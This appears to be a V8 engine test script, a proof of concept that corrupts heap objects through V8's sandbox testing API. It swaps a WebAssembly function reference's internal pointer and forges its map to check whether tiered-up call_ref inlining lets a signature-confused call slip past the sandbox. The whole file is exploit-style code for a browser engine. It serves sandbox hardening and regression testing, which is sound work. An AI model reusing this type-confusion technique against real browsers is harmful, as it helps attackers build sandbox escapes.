// C21 H29: optimized/tiered variant of H27.
//
// Collect feedback on call_ref with func1(i64)->i32, then transplant
// func0(ref struct)->void into func1's WasmFuncRef and corrupt func0's map to
// pass ref.cast, following the upstream optimized-shape guard. Use an in-bounds
// struct write so a bypass is observable without relying on crash/OOB.
//
// Safe outcome: process killed by sandbox sig-check before wrong inline target.
// Buggy outcome: struct field changes to 0x41414141.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();

let box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let s = builder.addStruct([makeField(kWasmI32, true)]);
let sig_i_l = builder.addType(kSig_i_l);

let f0 = builder.addFunction('func0', makeSig([wasmRefType(s)], []))
    .exportFunc()
    .addBody([
      kExprLocalGet, 0,
      ...wasmI32Const(0x41414141),
      kGCPrefix, kExprStructSet, s, 0,
    ]);

let f1 = builder.addFunction('func1', sig_i_l)
    .exportFunc()
    .addBody([
      kExprLocalGet, 0,
      kExprI32ConvertI64,
    ]);

builder.addFunction('get_func0', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, f0.index,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('get_func1', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, f1.index,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('make_struct', kSig_r_v).exportFunc().addBody([
  ...wasmI32Const(7),
  kGCPrefix, kExprStructNew, s,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('read_struct', makeSig([wasmRefType(s)], [kWasmI32]))
    .exportFunc()
    .addBody([
      kExprLocalGet, 0,
      kGCPrefix, kExprStructGet, s, 0,
    ]);

builder.addFunction('boom', makeSig([kWasmFuncRef, kWasmI64], [kWasmI32]))
    .exportFunc()
    .addBody([
      kExprLocalGet, 1,
      kExprLocalGet, 0,
      kGCPrefix, kExprRefCast, sig_i_l,
      kExprCallRef, sig_i_l,
    ]);

let instance = builder.instantiate();
let boom = instance.exports.boom;
let func1 = instance.exports.func1;

for (let i = 0; i < 20; i++) boom(func1, 0n);

const kHeapObjectTag = 1;
const kMapOffset = 0;
const kStructField0Offset = 8;
const kWasmFuncRefType = Sandbox.getInstanceTypeIdFor('WASM_FUNC_REF_TYPE');
const kWasmFuncRefInternalOffset =
    Sandbox.getFieldOffset(kWasmFuncRefType, 'trusted_internal');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let f0Box = getPtr(instance.exports.get_func0());
let f0Ref = getField(f0Box, kStructField0Offset);
let f0Internal = getField(f0Ref, kWasmFuncRefInternalOffset);

let f1Box = getPtr(instance.exports.get_func1());
let f1Ref = getField(f1Box, kStructField0Offset);

setField(f1Ref, kWasmFuncRefInternalOffset, f0Internal);
let f1Map = getField(f1Ref, kMapOffset);
setField(f0Ref, kMapOffset, f1Map);

let obj = instance.exports.make_struct();
print(`before=0x${instance.exports.read_struct(obj).toString(16)}`);

%WasmTierUpFunction(boom);

try {
  let ret = boom(instance.exports.get_func0(), 0n);
  print(`ret=${ret}`);
  print(`after=0x${instance.exports.read_struct(obj).toString(16)}`);
} catch (e) {
  print(`throw=${e.name}:${e.message}`);
}
